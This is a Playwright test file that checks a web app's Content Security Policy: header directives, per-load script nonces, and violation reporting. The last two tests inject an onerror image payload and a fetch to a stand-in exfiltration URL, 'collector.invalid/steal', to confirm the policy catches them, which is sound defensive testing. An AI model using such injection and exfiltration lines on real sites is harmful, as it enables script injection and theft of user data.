import { expect, test, type Page } from '@playwright/test';

/// The page policy (view 70). The e2e build runs it report-only, the default,
/// so these read the report-only header; a browser still raises a violation
/// event for everything the policy would block.

const POLICY = 'content-security-policy-report-only';

function nonceOf(policy: string): string {
  return policy.match(/'nonce-([^']+)'/)?.[1] ?? '';
}

async function violations(page: Page, act: () => Promise<void>): Promise<{ directive: string; blocked: string }[]> {
  await page.evaluate(() => {
    (window as unknown as { __csp: unknown[] }).__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      (window as unknown as { __csp: unknown[] }).__csp.push({ directive: e.effectiveDirective, blocked: e.blockedURI });
    });
  });
  await act();
  await page.waitForTimeout(300);
  return page.evaluate(() => (window as unknown as { __csp: { directive: string; blocked: string }[] }).__csp);
}

test('every page forbids framing, plugins, a <base> rewrite and posting forms elsewhere', async ({ page }) => {
  for (const path of ['/', '/market', '/start']) {
    const res = await page.goto(path);
    const csp = res?.headers()['content-security-policy'] ?? '';
    for (const directive of ["frame-ancestors 'none'", "object-src 'none'", "base-uri 'self'", "form-action 'self'"]) {
      expect(csp, `${path}: ${directive}`).toContain(directive);
    }
    expect(res?.headers()['x-frame-options'], path).toBe('DENY');
  }
});

test('every script on the page carries this load’s nonce, and the next load gets a new one', async ({ page }) => {
  const seen: string[] = [];
  for (const path of ['/', '/start', '/market']) {
    const res = await page.goto(path);
    const policy = res?.headers()[POLICY] ?? '';
    expect(policy, path).toContain("'strict-dynamic'");
    const nonce = nonceOf(policy);
    expect(nonce, path).not.toBe('');
    seen.push(nonce);
    const scripts = await page.evaluate(() =>
      Array.from(document.querySelectorAll('script')).map((s) => ({ src: s.src, nonce: s.nonce })),
    );
    expect(scripts.length, path).toBeGreaterThan(3);
    const without = scripts.filter((s) => s.nonce !== nonce);
    expect(without, path).toEqual([]);
  }
  expect(new Set(seen).size).toBe(seen.length);
});

test('a script put on the page without the nonce is caught', async ({ page }) => {
  await page.goto('/');
  const found = await violations(page, async () => {
    await page.evaluate(() => {
      const s = document.createElement('div');
      s.innerHTML = '<img src="x" onerror="window.__ran=1">';
      document.body.appendChild(s);
    });
  });
  // The handler runs only once the image fails to load, which can take longer
  // than the helper's short wait on a busy runner, so wait for the report itself.
  const caught = () => page.evaluate(() => (window as unknown as { __csp: { directive: string }[] }).__csp.some((v) => v.directive.startsWith('script-src')));
  if (!found.some((v) => v.directive.startsWith('script-src'))) await expect.poll(caught, { timeout: 10_000 }).toBe(true);
});

test('a call to a host the policy does not name is caught', async ({ page }) => {
  await page.goto('/');
  const found = await violations(page, async () => {
    await page.evaluate(() => fetch('https://collector.invalid/steal').catch(() => null));
  });
  expect(found.some((v) => v.directive === 'connect-src' && v.blocked.startsWith('https://collector.invalid'))).toBe(true);
});
